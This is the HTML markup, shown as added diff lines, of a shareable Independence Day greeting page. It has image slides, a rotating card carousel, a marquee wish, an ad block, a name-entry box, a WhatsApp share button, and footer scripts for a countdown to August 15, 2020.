+                                                                    <img data-src="/festival/images/festival/independence/en/20.png" class="p1" alt="" style="width: 80%;">
+                                                            </div>
+                        
+
+
+                    
+
+                    <!-- Images overlap -->
+                    
+
+                    <!-- Primary Image -->
+                                                                                            <div class="figures tenpxtop">
+                            <img data-src="/festival/images/festival/independence/en/12.png" class="p1" style="width: 90%;"> 
+                        </div>
+                    
+
+                    
+
+                    
+
+                    
+
+                                            <style>
+                            .mySlides{
+                                width: 90%; 
+                                display: none;
+                            }
+                        </style>
+                        <br/>
+                        <div class="myslides_div">
+                            <div style="display: block;text-align: -webkit-center; height: 300px; overflow: hidden;">
+                                                                    <img class="mySlides p3" data-src="/festival/images/festival/independence/en/14.gif" class="p3" style="max-height: 300px">
+                                                                    <img class="mySlides p3" data-src="/festival/images/festival/independence/en/15.png" class="p3" style="max-height: 300px">
+                                                                    <img class="mySlides p3" data-src="/festival/images/festival/independence/en/16.png" class="p3" style="max-height: 300px">
+                                                                    <img class="mySlides p3" data-src="/festival/images/festival/independence/en/10.gif" class="p3" style="max-height: 300px">
+                                                                    <img class="mySlides p3" data-src="/festival/images/festival/independence/en/17.png" class="p3" style="max-height: 300px">
+                                                                    <img class="mySlides p3" data-src="/festival/images/festival/independence/en/18.png" class="p3" style="max-height: 300px">
+                                                            </div>
+                        </div>
+                                        
+
+                    
+
+                                            <style>
+	.rcard{
+		padding: 0 0 0 50px;	
+	}
+	#spinner1 img {
+	    position: absolute;
+	    border: 1px solid #ccc;
+	    background: rgba(255,255,255,0.8);
+	    box-shadow: inset 0 0 0px rgba(0,0,0,0.2);
+	}
+	@-webkit-keyframes spinner1 {
+	from {
+	    -webkit-transform: rotateY(0deg);
+	}
+	to {
+	    -webkit-transform: rotateY(-360deg);
+	  }
+	}
+
+	#spinner1 {
+	  -webkit-animation-name: spinner1;
+	  -webkit-animation-timing-function: linear;
+	  -webkit-animation-iteration-count: infinite;
+	  -webkit-animation-duration: 5s;
+	  -webkit-transform-style: preserve-3d;
+	}
+	#spinner1:hover {
+	  -webkit-animation-play-state: paused;
+	}
+
+	#spinner1 img {
+	  position: absolute;
+	  border: 1px solid #ccc;
+	  background: rgba(255,255,255,0.8);
+	  box-shadow: inset 0 0 0px rgba(0,0,0,0.2);
+	}
+</style>
+
+<div id="stage" class="revolvingcards" style="padding-left:30%;align:center;height:121px;width:05%" class="tenpxtop">
+	<div id="spinner1" style="-webkit-transform-origin: 83px 0 0;">
+		<img class="rcard" style="-webkit-transform: rotateY(-60deg) translateX(83px);" src="/festival/images/festival/independence/en/d1.jpg" alt="">
+		<img class="rcard" style="-webkit-transform: rotateY(-120deg) translateX(83px);" src="/festival/images/festival/independence/en/d2.jpg" alt="">
+		<img class="rcard" style="-webkit-transform: rotateY(-180deg) translateX(83px);" src="/festival/images/festival/independence/en/d1.jpg" alt="">
+		<img class="rcard" style="-webkit-transform: rotateY(-240deg) translateX(83px);" src="/festival/images/festival/independence/en/d3.jpg" alt="">
+		<img class="rcard" style="-webkit-transform: rotateY(-300deg) translateX(83px);" src="/festival/images/festival/independence/en/d4.jpg" alt="">
+	</div>
+</div>                    
+
+                    
+
+                    <!-- Message -->
+                    <p class="main-msg white fivepxbottom">
+                        <span style='color: #f8c804;font-weight:800;'>Freedon in Mind</span><br>
+       				   <span style='color: #5bd883;font-weight:800;'>Faith in Words<br>
+       				   Pride in our Heart</span><br>
+       				   <span style='color: #f8c804;font-weight:800;'>Memories in our Souls</span><br> 
+       				   <span style='color: #f75830;font-weight:800;'>Lets Salute the Nation on<br><b>Independence Day!</span><b>
+                    </p>
+                    <div class="fivepxtop main-msg white">
+                        <span style='text-shadow: 1px 1px 3px #FF0000, 1px 1px 3px #FF0000, -1px -1px 3px #FF0000, -1px -1px 3px #FF0000;color: yellow;'>Happy Independence Day!!</span>
+                    </div>
+
+                    
+
+                                            <style>
+                            .ltrmarquee{
+                                font-size: 30px;
+                                font-weight: 600;
+                                display: inline;
+                                padding: 10px;
+                                color: #efbf09 !important;
+                            }
+                            .ltrmarquee_bg{
+                                border-radius: 20px;
+                                background-color: ;
+                            }
+                        </style>
+                        <marquee class="ltrmarquee_bg">
+                            <p class="ltrmarquee"><i><span class="user_name"></span> Wishing You <span style='text-shadow: 1px 1px 3px #FF0000, 1px 1px 3px #FF0000, -1px -1px 3px #FF0000, -1px -1px 3px #FF0000;color: yellow;'>Happy Independence Day!!</span></i></p>
+                        </marquee>
+                    
+                    
+                    <style>
+                        .glow {
+                            -webkit-animation: glowing 1500ms infinite !important;
+                            -moz-animation: glowing 1500ms infinite !important;
+                            -o-animation: glowing 1500ms infinite !important;
+                            animation: glowing 1500ms infinite !important;
+                            width: fit-content;
+                            margin-left: auto;
+                            margin-right: auto;
+                            padding: 8px;
+                            border-radius: 20px;
+                        }
+                        @-webkit-keyframes glowing {
+                            0% { background-color: #B20000; -webkit-box-shadow: 0 0 3px #B20000; }
+                            50% { background-color: #FF0000; -webkit-box-shadow: 0 0 40px #FF0000; }
+                            100% { background-color: #B20000; -webkit-box-shadow: 0 0 3px #B20000; }
+                        }
+                        @-moz-keyframes glowing {
+                            0% { background-color: #B20000; -moz-box-shadow: 0 0 3px #B20000; }
+                            50% { background-color: #FF0000; -moz-box-shadow: 0 0 40px #FF0000; }
+                            100% { background-color: #B20000; -moz-box-shadow: 0 0 3px #B20000; }
+                        }
+                        @-o-keyframes glowing {
+                            0% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+                            50% { background-color: #FF0000; box-shadow: 0 0 40px #FF0000; }
+                            100% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+                        }
+                        @keyframes  glowing {
+                            0% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+                            50% { background-color: #FF0000; box-shadow: 0 0 40px #FF0000; }
+                            100% { background-color: #B20000; box-shadow: 0 0 3px #B20000; }
+                        }
+                    </style>
+                    <br><br>
+                                            <div class="white from jump">
+                            <div class="glow">
+                                😇 From -  <span class="user_name" style=""></span> 😇
+                            </div>
+                        </div>
+                                        <br>
+                    
+
+
+                    
+
+
+
+                    
+    
+                                            <div class="center ad">
+                            <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+                            <ins class="adsbygoogle"
+                     style="display:block"
+                     data-ad-client="ca-pub-5619328392295032"
+                     data-ad-slot="3328750625"
+                     data-ad-format="auto"
+                     data-full-width-responsive="true"></ins>
+                <script>
+                     (adsbygoogle = window.adsbygoogle || []).push({});
+                </script>
+                        </div>
+
+                    
+
+                                            <div class="center ad adpushup_ad_disabled">
+                        </div>
+                    
+
+
+                    
+
+
+                </div>
+            </div>
+
+
+
+        </div>
+    </div>
+    </div>
+
+
+    <span id="share" class="share_block">
+    
+<span id="" class="float-share hidden" style="">
+    
+    
+            <a class="btn whatsapp-btn" href="">
+            <div class="whatsapp-share-text"><b> 👈 Share</b></div>
+            <img class="whatsapp-icon" src="/festival/images/common/whatsapp_icon.svg"> 
+        </a>
+    
+    
+
+    
+
+    
+
+</span>
+
+<div class="name hidden" id="create">
+
+    
+    <input class="card-title center-align name head" type="name" required="" id="name" style="color: #ffffff; background-color: #c71515" placeholder="Enter Your Name">
+    <a href="javascript:void(0)" class="go" id="gobtn1" style="background-color: #c71515" >Go 😍</a>
+</div>
+
+</span>
+
+</div>
+
+
+
+</body>
+
+
+<footer>
+
+    
+
+        
+    <script>
+        var count_down_date = 'Aug 15, 2020';
+        var enter_name = 'Enter Your Name';
+
+        var enter_wish = 'Enter your name in the box below, create your wish and Share with your Friends and Family 👇👇👇👇';
+        var whatsapp_msg = '&quot;\ud83d\ude07 *nammmmeeeeee* has proudly sent you a message!! %0A*Open Fast!!* \ud83d\udc47\ud83d\udc47%0A&quot;'.replace(/(&quot\;)/g,"");
+
+        var time = {"days" : 'Days', "hrs" : 'Hrs', "mins" : 'Min', "sec" : 'Sec'};
+    </script>
+    
+
+
+    <script>
+        var analytics = '164672458';
+        var locale = 'in';
+    </script>
+    <script src="https://openit.site/festival/js/gaevent.js?v=2"></script>
+
+    <script src="/festival/js/festival.js?f=38"></script>
+
+
+    
+    
+
+    
+    
+            <script src="/festival/js/doodle.js"></script>
+<script>
+    doodle.init("/festival/images/doodle/plane.png");
+</script>
+<canvas id="canvas_doodle" height="409" width="1440" style="position: fixed; top: 0px; left: 0px; z-index: 1138; pointer-events: none;"></canvas>    
+
+</footer>
+
+
+</html>
+
